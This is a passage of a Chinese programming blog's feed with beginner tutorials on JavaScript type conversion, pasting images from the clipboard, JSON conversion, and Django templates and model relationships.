&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;Number(&lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;将其他的数据类型转换为 Boolean 类型&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;Boolean(&lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;11实现-ctrlv-粘贴图片&#34;&gt;11.实现 ctrl+v 粘贴图片&lt;/h2&gt;
&lt;p&gt;ctrl+v 粘贴图片都是监听 paste 事件实现的，复制的数据都存在 clipboardData 下面。&lt;/p&gt;
&lt;p&gt;打印 clipboardData.items，可以发现是一个 DataTransferItem，可以使用 getAsFile() 的方法获取文件&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;document.&lt;span style=&#34;color:#a6e22e&#34;&gt;addEventListener&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;paste&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;event&lt;/span&gt;) {
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;event&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;isChrome&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;event&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;clipboardData&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;event&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;originalEvent&lt;/span&gt;) {
        &lt;span style=&#34;color:#75715e&#34;&gt;//某些chrome版本使用的是event.originalEvent
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;clipboardData&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;event&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;clipboardData&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;event&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;originalEvent&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;clipboardData&lt;/span&gt;);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;clipboardData&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;items&lt;/span&gt;){
            &lt;span style=&#34;color:#75715e&#34;&gt;// for chrome
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;items&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;clipboardData&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;items&lt;/span&gt;,
            &lt;span style=&#34;color:#a6e22e&#34;&gt;len&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;items&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;,
            &lt;span style=&#34;color:#a6e22e&#34;&gt;blob&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;isChrome&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;len&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
               &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;items&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;]);
               &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;items&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;indexOf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;image&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) {
                  &lt;span style=&#34;color:#75715e&#34;&gt;//getAsFile()
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;                  &lt;span style=&#34;color:#a6e22e&#34;&gt;blob&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;items&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;getAsFile&lt;/span&gt;();
               }
           }
        }
    }
})
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;此时就可以获取到 blob 对象了，这时候可以选择显示在页面上，也可以选择发送给后台&lt;/p&gt;
&lt;p&gt;使用 blob 对象显示&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;blobUrl&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;URL&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;createObjectURL&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;blob&lt;/span&gt;);
document.&lt;span style=&#34;color:#a6e22e&#34;&gt;getElementById&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;imgNode&amp;#34;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;src&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;blobUrl&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用 base64 显示&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;reader&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;onload&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;event&lt;/span&gt;) {
     &lt;span style=&#34;color:#75715e&#34;&gt;// event.target.result 即为图片的Base64编码字符串
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;base64_str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;event&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;target&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;result&lt;/span&gt;;
     document.&lt;span style=&#34;color:#a6e22e&#34;&gt;getElementById&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;imgNode&amp;#34;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;src&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;base64_str&lt;/span&gt;;
}
&lt;span style=&#34;color:#a6e22e&#34;&gt;reader&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;readAsDataURL&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;blob&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;生成 formData 上传&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fd&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;FormData&lt;/span&gt;();
&lt;span style=&#34;color:#a6e22e&#34;&gt;fd&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;append&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;the_file&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;blob&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;image.png&amp;#39;&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;12web-应用性能分析工具-harhttp-archive-format&#34;&gt;12.Web 应用性能分析工具 HAR（HTTP Archive format）&lt;/h2&gt;
&lt;p&gt;HAR 文件，是用来记录浏览器加载网页时所消耗的时间的工具。它可以记录每一个 HTTP 请求发出直到收到完整的 HTTP 响应中间所耗费的时间，可以迅速帮助我们知道是哪些 HTTP 请求没有得到及时的回复，从而进行更一步的排查。同时可以使用 Httprunner 生成业务脚本&lt;/p&gt;
&lt;h2 id=&#34;13object-转字符串&#34;&gt;13.object 转字符串&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;obj&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
     &lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,
     &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;张三&amp;#39;&lt;/span&gt;,
     &lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;
}
&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;objToStr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;JSON&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;stringify&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;obj&lt;/span&gt;)
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;obj:&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;obj&lt;/span&gt;)
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;objToStr:&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;objToStr&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;14json-字符串转-object&#34;&gt;14.json 字符串转 object&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;{&amp;#34;id&amp;#34;:0,&amp;#34;name&amp;#34;:&amp;#34;张三&amp;#34;,&amp;#34;age&amp;#34;:12}&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;strToObj&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;JSON&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;parse&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt;)
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;str:&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt;)
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;strToObj:&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;strToObj&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Django—在模板中遍历字典</title>
        <link>https://ac-lm.github.io/posts/django/django%E5%9C%A8%E6%A8%A1%E6%9D%BF%E4%B8%AD%E9%81%8D%E5%8E%86%E5%AD%97%E5%85%B8/</link>
        <pubDate>Wed, 02 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/django/django%E5%9C%A8%E6%A8%A1%E6%9D%BF%E4%B8%AD%E9%81%8D%E5%8E%86%E5%AD%97%E5%85%B8/</guid>
        <description>&lt;h2 id=&#34;1遍历字典&#34;&gt;1.遍历字典&lt;/h2&gt;
&lt;p&gt;在模版中要遍历字典 dict ，一般使用如下代码实现&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;{&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; key,value &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; param&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;items &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;} 
    {{ key }}
    {{ value }}
{&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; endfor &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Django—Models</title>
        <link>https://ac-lm.github.io/posts/django/djangomodels/</link>
        <pubDate>Tue, 01 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/django/djangomodels/</guid>
        <description>&lt;h2 id=&#34;1模型的基本概念&#34;&gt;1.模型的基本概念&lt;/h2&gt;
&lt;p&gt;Django 中每个模型都是一个 Python 类，这些类继承自 &lt;code&gt;django.db.models.Model&lt;/code&gt;。模型类的每个属性都相当于一个数据库的字段。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; django.db &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; models
&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Person&lt;/span&gt;(models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Model):
    first_name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;CharField(max_length&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;)
    last_name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;CharField(max_length&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上述代码相当于使用数据库语言创建一个 Person 表单，有两个字段 first_name 与 last_name&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;CREATE&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;TABLE&lt;/span&gt; myapp_person (
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;id&amp;#34;&lt;/span&gt; serial &lt;span style=&#34;color:#66d9ef&#34;&gt;NOT&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;NULL&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;PRIMARY&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;KEY&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;first_name&amp;#34;&lt;/span&gt; varchar(&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;NOT&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;NULL&lt;/span&gt;,
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;last_name&amp;#34;&lt;/span&gt; varchar(&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;NOT&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;NULL&lt;/span&gt;
);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2使用模型&#34;&gt;2.使用模型&lt;/h2&gt;
&lt;p&gt;在定义模型后，你需要告诉 Django 将使用这些模型。通过编辑你的设置文件 setting.py，改变 INSTALLED_APPS 设置来添加包含你 models.py 的模块的名称来实现这一点。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;INSTALLED_APPS &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
    &lt;span style=&#34;color:#75715e&#34;&gt;#...&lt;/span&gt;
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;myapp&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#75715e&#34;&gt;# 模块名&lt;/span&gt;
    &lt;span style=&#34;color:#75715e&#34;&gt;#...&lt;/span&gt;
]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3字段&#34;&gt;3.字段&lt;/h2&gt;
&lt;h3 id=&#34;a字段类型&#34;&gt;a.字段类型&lt;/h3&gt;
&lt;p&gt;略&lt;/p&gt;
&lt;h3 id=&#34;b字段选项&#34;&gt;b.字段选项&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;max_length：该参数指定用于存储数据的 VARCHAR 数据库字段的大小。&lt;/li&gt;
&lt;li&gt;null：如果是 True，Django 会将空置的值存储为 NULL。默认是 False。&lt;/li&gt;
&lt;li&gt;blank ：如果是 True，这个字段是空白的。默认是 False。注意，这与 null 不同的是，null 与数据库相关，而 blank 则是与验证相关的。如果一个字段有 blank=True ，表单验证就允许输入空值。如果一个字段有 blank=False ，则需要字段。&lt;/li&gt;
&lt;li&gt;choices：2元组的可迭代，例如，列表或元组的元素选择。&lt;/li&gt;
&lt;li&gt;default：字段的默认值。&lt;/li&gt;
&lt;li&gt;unique：如果是真的，这个字段必须在整个表中是唯一的。&lt;/li&gt;
&lt;li&gt;related_nam：使用外键时调用的名字。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;c自动主键字段&#34;&gt;c.自动主键字段&lt;/h3&gt;
&lt;p&gt;在默认情况下，Django默认提供了主键字段：&lt;code&gt;id = models.AutoField(primary_key=True)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这是一个自动递增的主键。如果您想要指定一个定制的主键，请在您的一个字段中指定 primarykey=True。如果 Django 看到你已经明确地设置了主键，那它便不会添加自动 id。&lt;/p&gt;
&lt;h2 id=&#34;4关联关系&#34;&gt;4.关联关系&lt;/h2&gt;
&lt;p&gt;显然，关系数据库的功能在于将表相互关联起来。Django 提供了定义三种最常见的数据库关系类型的方法：多对一、多对多和一对一。&lt;/p&gt;
&lt;p&gt;注意：某些版本必须给定 on_delete 属性值才能创建关联关系。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;models.CASCADE(默认选项)：当 Wife 关联的 Husband 被删除时，Wife 也会被一同删除，反之，Husband 不会被删除。&lt;/li&gt;
&lt;li&gt;models.PROTECT(保护选项)：设置该选项后，若要删除 Husband 的数据，且该数据关联 Wife 中的数据，此时系统会报错提示数据受保护，反之可以正常删除。&lt;/li&gt;
&lt;li&gt;models.SET_NULL(空值选项)：设置该选项后，若要删除 Husband 的数据，且该数据关联 Wife 中的数据，可正常删除，且 Wife 不会被删除，此时会把 Wife 的关联数据设置为空，注意使用此选项时必须设置 null=True（允许空值），否则会出现异常。&lt;/li&gt;
&lt;li&gt;models.SET_DEFAULT(默认值选项)：该选项与 SET_NULL 类似，当删除与 Wife 绑定的 Husband 时，会把 Wife 的关联数据设置为默认值，注意使用此选项时必须设置 Default=默认值，否则会出现异常。&lt;/li&gt;
&lt;li&gt;models.SET()：当删除与 Wife 绑定的 Husband 时，会把 Wife 的关联数据设置为括号内的值，注意防止设置的值与其他设置冲突。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;a多对一&#34;&gt;a.多对一&lt;/h3&gt;
&lt;p&gt;字段 ForeignKey&lt;/p&gt;
&lt;p&gt;例如，如果一个汽车模型有一个制造商，也就是说，制造商生产多辆汽车，但每辆车都只有一个制造商，可以使用以下定义：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; django.db &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; models

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Manufacturer&lt;/span&gt;(models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Model):
    &lt;span style=&#34;color:#75715e&#34;&gt;# ...&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Car&lt;/span&gt;(models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Model):
    manufacturer &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ForeignKey(Manufacturer, on_delete&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;CASCADE)
    &lt;span style=&#34;color:#75715e&#34;&gt;# ...&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;b多对多&#34;&gt;b.多对多&lt;/h3&gt;
&lt;p&gt;字段 ManyToManyField&lt;/p&gt;
&lt;p&gt;例如，一个 pizza 有多个 topping 的对象，而一个topping也可以在多个 pizza 上，使用以下定义：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Topping&lt;/span&gt;(models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Model):
